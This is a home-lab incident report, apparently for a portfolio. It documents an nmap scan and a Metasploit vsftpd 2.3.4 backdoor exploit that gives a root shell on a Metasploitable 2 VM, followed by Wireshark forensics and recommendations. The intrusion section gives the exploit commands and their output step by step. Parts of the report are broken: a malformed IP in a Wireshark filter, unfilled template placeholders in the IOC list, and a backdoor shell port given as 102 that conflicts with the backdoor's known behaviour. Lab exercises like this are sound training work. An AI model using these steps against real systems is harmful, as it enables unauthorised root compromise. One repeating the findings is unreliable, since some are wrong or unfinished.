
# Project 1: Home SOC & Live Intrusion Analysis

### Date: 2025-07-28

### Author: Shahid

---

## 1. Executive Summary

*This report details a simulated cyber intrusion exercise conducted within a controlled, virtualized lab environment. A full-cycle attack was performed, beginning with network reconnaissance and culminating in a successful root-level compromise of a target Linux server. Subsequent forensic analysis of captured network traffic successfully reconstructed the attacker's methodology, from the initial port scan to the exploitation of a vulnerable FTP service and the establishment of an unencrypted command and control channel. The investigation identified key Indicators of Compromise (IOCs) and concluded with strategic recommendations for containment, eradication, and future prevention. This project demonstrates a practical, hands-on application of both offensive penetration testing techniques and defensive incident response procedures.*

## 2. Lab Architecture & Setup

This project utilized a virtualized network environment to simulate a live intrusion scenario. The objective was to perform a full-cycle incident analysis, from detection to reporting.

* **Attacker Machine:**

* **Operating System:** Kali Linux

* **IP Address:**  [192.168.249.128]

* **Victim Machine:**

* **Operating System:** Metasploitable 2 (Linux)

* **IP Address:**  [192.168.249.129]

* **Network Configuration:**

* **Type:** VMware Host-Only Network

* **Description:** An isolated virtual network segment enabling communication between the Attacker and Victim VMs, while preventing external access.

---

## 3. Phase 1: Monitoring & Detection Setup

To detect the intrusion, network monitoring was established on the victim machine *prior* to the attack. The `tcpdump` utility was used to capture all network traffic to a packet capture (`.pcap`) file for later forensic analysis.

* **Tool Used:**  `tcpdump`

* **Command Executed on Victim (`192.168.249.129`):**

```bash

sudo tcpdump -i eth0 -w attack_capture.pcap

```

* **Status:** The capture was initiated and left running to ensure all stages of the subsequent attack were recorded.

## 4. Phase 2: The Intrusion (Attacker Simulation)

A simulated attack was launched from the Kali Linux VM against the Metasploitable 2 target. The attack followed the standard penetration testing lifecycle: reconnaissance followed by exploitation.

### Step 1: Reconnaissance with Nmap

An `nmap` "Fast Scan" (`-F`) was conducted to quickly identify common open ports on the target.

* **Command Executed on Attacker (`192.168.249.128`):**

```bash

nmap -F 192.168.249.129

```

* **Nmap Output:**

```plaintext

% nmap -F 192.168.249.129

Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 01:58 EDT

Nmap scan report for 192.168.249.129

Host is up (0.0024s latency).

Not shown: 82 closed tcp ports (reset)

PORT STATE SERVICE

21/tcp open ftp

22/tcp open ssh

23/tcp open telnet

25/tcp open smtp

53/tcp open domain

80/tcp open http

111/tcp open rpcbind

139/tcp open netbios-ssn

445/tcp open microsoft-ds

513/tcp open login

514/tcp open shell

2049/tcp open nfs

2121/tcp open ccproxy-ftp

3306/tcp open mysql

5432/tcp open postgresql

5900/tcp open vnc

6000/tcp open X11

8009/tcp open ajp13

MAC Address: 00:0C:29:31:99:D1 (VMware)


Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds

 
```

* **Analysis:** The scan revealed numerous open ports, including the historically vulnerable Port 21 (FTP), which was selected as the primary vector for exploitation.

### Step 2: Exploitation with Metasploit Framework

The Metasploit Framework was used to exploit a known backdoor in the VSFTPD service running on the target.

* **Metasploit Commands:**

```

msfconsole -q

use exploit/unix/ftp/vsftpd_234_backdoor

set RHOSTS 192.168.249.129

exploit

```

* **Result:** The exploit was successful, and a command shell session was opened to the victim machine.

### Step 3: Verifying the Foothold

To confirm the level of access achieved, two commands were run on the compromised host.

* **Command 1:**  `whoami`

* **Output 1:**

```plaintext

root

```

* **Command 2:**  `hostname`

* **Output 2:**

```plaintext

metasploitable

```

* **Analysis:** The attacker successfully gained a root-level shell, signifying a full compromise of the system.

## 5. Phase 3: Forensic Investigation

Following the simulated intrusion, the role shifted to a Blue Team / SOC Analyst to investigate the breach. The primary source of evidence was the full packet capture (`attack_capture.pcap`) recorded by `tcpdump` on the victim machine during the attack.

### Step 1: Evidence Acquisition

The `tcpdump` process on the victim was stopped, and the resulting `.pcap` file was securely transferred to the analyst's workstation (Kali Linux) using `scp` for analysis.

### Step 2: Network Traffic Analysis with Wireshark

The packet capture was opened in Wireshark to reconstruct the attacker's actions. Specific display filters were used to isolate key events.

* **Finding 1: Identifying the Reconnaissance Scan**
  * **Wireshark Filter:** `tcp.flags.syn == 1 and tcp.flags.ack == 0 and ip.src == 192.168249.128`
  * **Analysis:** `A large volume of TCP SYN packets was observed originating from the attacker's IP, targeting multiple ports on the victim, which is a clear signature of an nmap port scan.`

* **Finding 2: Identifying the Exploitation Traffic**
  * **Wireshark Filter:** `ip.addr == 192.168.249.128 && ip.addr == 192.168.249.129 && tcp`
  * **Analysis:** `The attacker exploited the`vsftpd`vulnerability via FTP on Port 21, which served only to trigger the backdoor. The **actual reverse shell session** was established over this **separate high-numbered port** (102), consistent with known behavior of the vsftpd 2.3.4 backdoor.`

---

## 6. Indicators of Compromise (IOCs)

The following technical artifacts were identified during the investigation and can be used for future threat hunting and detection.

* **Attacker IP Address:** `[Your Kali IP]`
* **Malicious Network Traffic:**
  * TCP SYN scan targeting multiple ports.
  * Unencrypted command and control (C2) traffic observed on TCP Port `[The high port you found, e.g., 102]`.
* **Vulnerability Exploited:** VSFTPD v2.3.4 Backdoor Vulnerability.

## 7. Conclusion & Recommendations

The investigation successfully reconstructed the full attack chain. The attacker began with network reconnaissance (`nmap`), which identified a vulnerable FTP service. They then used an exploit from the Metasploit Framework to gain a root-level command shell on the victim server. The entire attack, including the unencrypted C2 channel, was captured and analyzed.

**Recommendations:**

* **Immediate Containment:** The compromised host should be isolated from the network.
* **Eradication:** The vulnerable VSFTPD service must be patched or removed. Any persistence mechanisms created by the attacker (e.g., new user accounts) should be identified and removed.
* **Hardening:** A host-based firewall should be configured on the server to restrict access to only necessary ports.
* **Future Prevention:** Implement an Intrusion Detection System (IDS) like Suricata or Zeek to automatically alert on network scanning and suspicious command shell traffic in the future.
